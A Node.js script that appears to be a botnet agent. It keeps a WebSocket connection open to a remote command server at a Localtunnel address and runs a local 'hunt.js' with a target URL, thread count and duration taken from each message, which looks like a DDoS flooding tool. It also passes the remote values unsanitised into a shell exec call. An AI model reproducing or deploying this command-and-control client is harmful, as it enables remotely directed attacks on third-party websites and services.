const WebSocket = require('ws');
const { exec } = require('child_process');

const SERVER_URL = 'ws://runxhellport.loca.lt'; // Replace with your Localtunnel URL

const connectToServer = () => {
    const ws = new WebSocket(SERVER_URL);

    ws.on('open', () => {
        console.log('Connected to server');
    });

    ws.on('message', (message) => {
        const { thread, url, time } = JSON.parse(message);
        cmd="cook"
        if (cmd=='cook') {
            console.log(`Executing command: cook with URL: ${url}, Thread: ${thread}, Time: ${time}`);
            exec(`node hunt.js ${url} ${thread} ${time}`, (error, stdout, stderr) => {
                if (error) {
                    console.error(`Error executing command: ${error.message}`);
                    return;
                }
                if (stderr) {
                    console.error(`Error: ${stderr}`);
                    return;
                }
                console.log(`Output: ${stdout}`);
            });
        }
    });

    ws.on('close', () => {
        console.log('Disconnected from server. Reconnecting...');
        setTimeout(connectToServer, 5000); // Reconnect after 5 seconds
    });

    ws.on('error', (error) => {
        console.error('WebSocket error:', error);
    });
};

connectToServer();
